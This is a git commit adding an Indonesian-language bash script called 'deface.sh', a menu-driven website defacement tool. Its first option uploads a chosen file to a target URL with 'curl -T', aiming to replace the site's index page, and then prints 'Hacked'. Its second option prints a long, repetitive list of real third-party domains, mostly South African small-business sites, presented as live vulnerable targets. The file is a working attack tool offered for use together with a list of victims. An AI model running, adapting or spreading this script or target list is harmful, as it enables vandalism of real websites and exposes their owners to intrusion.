6eb32a501f1bcb9fd3864f782af131b7364799d3
High Level Injection <63946603+nyazyad@users.noreply.github.com>
2020-04-20 21:25:17 +0800

    Add files via upload

---
+++ deface.sh
@@ -0,0 +1,357 @@
+#usr/bin/bash
+clear
+bi='\033[34;1m' #biru
+i='\033[32;1m' #ijo
+pur='\033[35;1m' #purple
+cy='\033[36;1m' #cyan
+me='\033[31;1m' #merah
+pu='\033[37;1m' #putih
+ku='\033[33;1m' #kuning
+# Jangan Recode Ya gay:V
+# yang Recode Moga MasOk sorga:V
+echo $cy
+echo ' _______   __ _    ____     ____    _    _   _ ____  
+|__  /\ \ / // \  |  _ \   / ___|  / \  | \ | / ___| 
+  / /  \ V // _ \ | | | | | |  _  / _ \ |  \| \___ \ 
+ / /_   | |/ ___ \| |_| | | |_| |/ ___ \| |\  |___) |
+/____|  |_/_/   \_\____/   \____/_/   \_\_| \_|____/ 
+'
+echo $i
+echo '(Deface Tebas Index)'
+echo $ku
+echo '------------------------------------------------'
+echo 'Instagram Aink: @py.zyad'
+echo '------------------------------------------------'
+echo $pur
+echo 'Buset lu mau jdi depeser modal Tools?:V'
+echo $i
+echo '-------------------------------'
+echo '[A] MULAI DEPES'
+echo '[B] WEBSITE VULN NIEH:V'
+echo '-------------------------------'
+echo
+read -p "[PILIH]:~# "  apaan
+echo
+if [ $apaan = "A" ] || [ $apaan = "a" ]
+then
+echo $me "Simpan SC Di Memory Internal Di Luar Folder "
+echo
+echo $i
+read -p "[WEB TARGET]:~# "  target
+echo
+echo $me "Masukan Script!!! "
+echo $i
+read -p "[SCRIPT]:~# "  script
+curl -T /storage/emulated/0/$script $target
+echo $red "["$ku"Hacked"$me"]"$cy"～～～＞"$i" $target"
+echo $ku
+echo '[KEMBALI TEKAN TOMBOL ENTER]'
+echo $cy
+read -p '[BACK]' asu
+clear
+sh deface.sh
+fi
+
+if [ $apaan = "B" ] || [ $apaan = "b" ]
+then
+echo
+echo $ku "Live Target"
+echo $me
+echo "http://contsol.co.za
+http://bitsandpieces.co.za
+http://windmillsandporcupines.co.za
+http://scnc.co.za
+http://contsol.co.za
+http://colourfactory.co.za
+http://ayk.co.za
+http://daretogowildafrica.co.za
+http://floralandfresh.co.za
+http://foodconsult.co.za
+http://itsengineering.co.za
+http://hybriddevelopments.co.za
+http://hololiopicbreathwork.co.za
+http://hanover-cs.co.za
+http://handj.co.za
+http://lwrm.co.za
+http://lpenterprises.co.za
+http://kwalitycommodities.co.za
+http://mestern.co.za
+http://megro.co.za
+http://butterflowers.co.za
+http://esfml.com
+http://mc3qs.com
+http://marjoriebresler.com
+http://naturaleyeimages.com
+http://my-resume.biz
+http://mpark.co.za
+http://monliestin.com
+http://africa-one.co.za
+http://ads247.co.za
+http://accelerate-kids.co.za
+http://8x8.co.za
+http://aaglcapetown2013.org.za
+http://allpaint.co.za
+http://andrewswebcorner.co.za
+http://applebyguesthouse.com
+http://atlanticphysio.co.za
+http://page31.co.za
+http://vaigaidigitals.com
+http://systemshouse.co.za
+http://www.studentsonline.co.za
+http://lucaniphysio.co.za
+http://www.onboardpublications.co.za
+http://www.oilandclay.co.za
+http://www.aquafitness.za.net
+http://www.helderbergit.co.za
+http://www.pipelinetape.co.za
+http://www.drcrsaexpress.co.za
+http://officeelf.co.za
+http://lioop-1539.org
+http://happy.mikikk.co.jp
+http://happy.mikikk.co.jp
+http://www.alfunctiondesigns.co.za
+http://mix007.co.za
+http://spyroom.co.za
+http://sportspod.co.za
+http://southernafricablog.com
+http://stand66.com
+http://tapifare.com
+http://tankertech.co.za
+http://tcnig.co.za
+http://tcmgroup.co.za
+http://liessor.co.za
+http://liafficam.co.za
+http://tuthukani.co.za
+http://nyarhi.co.za
+http://digishop.co.za
+http://elinemsa.co.za
+http://disucctv.co.za
+http://www.cai.co.za
+http://tirupurjobs.net
+http://inlislitev3.perpusnas.go.id
+http://clcooling.co.za
+http://sublimeconfectionery.co.za
+http://gogreenplumbing.co.za
+http://golfbuzz.co.za
+http://grupo-cma.com
+http://inkspot.co.za
+http://kgarebana.co.za
+http://itliader.co.za
+http://itliader.co.za
+http://hellomobile.mobi
+http://homebuzz.co.za
+http://gordonhoward.co.za
+http://democonsliuction.co.za
+http://chasingfantasia.co.za
+http://litehouse.co.za
+http://ldata.co.za
+http://lunique.co.za
+http://chillibitez.co.za
+http://cmweb.co.za
+http://essentialtours.com
+http://entitledvip.com
+http://frankadesign.com
+http://forget-me-not.co.za
+http://findpersonnel.co.za
+http://everythingdating.co.za
+http://gofigureliaining.co.za
+http://mistyorchards.co.za
+http://i2iconsulting.co.za
+http://hulsmandoors.co.za
+http://n8tive.co.za
+http://mullets.co.za
+http://lunique.co.za
+http://marcuskneen.co.za
+http://maggis.co.za
+http://mambabiz.com
+http://loveless.co.za
+http://legal-loans.co.za
+http://lefort.co.za
+http://lavoro.co.za
+http://kohl.co.za
+http://kobralocks.com
+http://karma-it.co.za
+http://kalinga.co.za
+http://ihx.co.za
+http://homes2view.co.za
+http://careandcure.cc
+http://officezone.co.za
+http://nhisa.co.za
+http://sinudeity.co.za
+http://bitpc.co.za
+http://inkspot.co.za
+http://agssela.co.za
+http://grassroute.co.za
+http://stseng.co.za
+http://sabookings.co.za
+http://nhsgilde.co.za
+http://agridex.net
+http://stitchaccounting.co.za
+http://cavalier.za.net
+http://ftkliust.co.za
+http://eveni.co.za
+http://lilabs.co.za
+http://tussenduine.co.za
+http://ujwcape.co.za
+http://gmet.co.za
+http://gearboxpros.co.za
+http://sorgatz.ch
+http://shls001.com
+http://lioop-1539.org
+http://tirupurjobs.net
+http://www.diascope.it
+http://shls001.com
+http://happy.mikikk.co.jp
+http://branch.prospec.co.th
+http://apparelworld.org
+http://beeit.co.za
+http://lioon.co.za
+http://liafficam.co.za
+http://foodconsult.co.za
+http://crimsonmonkeyweb.com
+http://hanover-cs.co.za
+http://tapifare.com
+http://chillibitez.co.za
+http://bee-it.co.za
+http://butterflowers.co.za
+http://bananabox.co.za
+http://ayk.co.za
+http://ads247.co.za
+http://allpaint.co.za
+http://atlanticphysio.co.za
+http://valdicare.co.za
+http://vmicl.co.za
+http://lioon.co.za
+http://nyarhi.co.za
+http://niliobikes.co.za
+http://nhisa.co.za
+http://netcallcollect.co.za
+http://naturaleyeimages.com
+http://mpark.co.za
+http://contsol.co.za
+http://colourfactory.co.za
+http://chillibitez.co.za
+http://chasingfantasia.com
+http://cenlialtech.co.za
+http://moneyin1week.co.za
+http://mix007.co.za
+http://mediacube.co.za
+http://megro.co.za
+http://menogold.co.za
+http://mestern.co.za
+http://tcmgroup.co.za
+http://sublimeconfectionery.co.za
+http://tieronecapital.co.za
+http://thegiftstore.co.za
+http://thefoundation.co.za
+http://liessor.co.za
+http://bipolar.co.za
+http://my-landy.co.za
+http://to-do.co.za
+http://h-c.name
+http://mojapelo.co.za
+http://portviewhouse.co.za
+http://whadiz.com
+http://braziliansandalco.co.za
+http://xposurephotography.co.za
+http://aquafitness.za.net
+http://techdirect.co.za
+http://tcnig.co.za
+http://tankertech.co.za
+http://tcmgroup.co.za
+http://systemshouse.co.za
+http://sublimeconfectionery.co.za
+http://tieronecapital.co.za
+http://thepremiummakers.com
+http://thembelahome.co.za
+http://thegiftstore.co.za
+http://thefoundation.co.za
+http://liessor.co.za
+http://ziady.com
+http://paradiseyouthclub.com
+http://kabby.tk
+http://dryfaden.com
+http://beydagida.com
+http://ariquemesagencia.com.br
+http://quintessential-tours.com
+http://prorepafrica.com
+http://rollaslat.com
+http://orbfusion.com
+http://jormid.net
+http://savanacloud.com
+http://opiniong.com
+http://orbfusion.com
+http://studentsonline.co.za
+http://safemode.co.za
+http://cederberghouse.co.za
+http://rollaslat.com
+http://roofliuss.co.za
+http://savanacloud.com
+http://southernafricablog.com
+http://stand66.com
+http://tapifare.com
+http://techdirect.co.za
+http://thepremiummakers.com
+http://thepremiummakers.com
+http://liafficam.co.za
+http://whadiz.com
+http://whosting.co.za
+http://whosting.co.za
+http://savanacloud.com
+http://opiniong.com
+http://thepremiummakers.com
+http://quintessential-tours.com
+http://prorepafrica.com
+http://rollaslat.com
+http://orbfusion.com
+http://jormid.net
+http://savanacloud.com
+http://orbfusion.com
+http://studentsonline.co.za
+http://safemode.co.za
+http://cederberghouse.co.za
+http://rollaslat.com
+http://roofliuss.co.za
+http://savanacloud.com
+http://southernafricablog.com
+http://stand66.com
+http://bee-it.co.za
+http://butterflowers.co.za
+http://bananabox.co.za
+http://ayk.co.za
+http://ads247.co.za
+http://allpaint.co.za
+http://atlanticphysio.co.za
+http://valdicare.co.za
+http://vmicl.co.za
+http://lioon.co.za
+http://nyarhi.co.za
+http://niliobikes.co.za
+http://nhisa.co.za
+http://netcallcollect.co.za
+http://naturaleyeimages.com
+http://mpark.co.za
+http://contsol.co.za
+http://colourfactory.co.za
+http://chillibitez.co.za
+http://chasingfantasia.com
+http://cenlialtech.co.za
+http://moneyin1week.co.za
+http://mix007.co.za
+http://mediacube.co.za
+http://megro.co.za
+http://menogold.co.za
+http://mestern.co.za
+http://tcmgroup.co.za
+http://sublimeconfectionery.co.za
+http://tieronecapital.co.za
+http://thegiftstore.co.za
+http://thefoundation.co.za
+http://liessor.co.za"
+echo $ku
+echo '[KEMBALI TEKAN TOMBOL ENTER]'
+echo $cy
+read -p '[BACK]' asu
+clear
+sh deface.sh
+fi
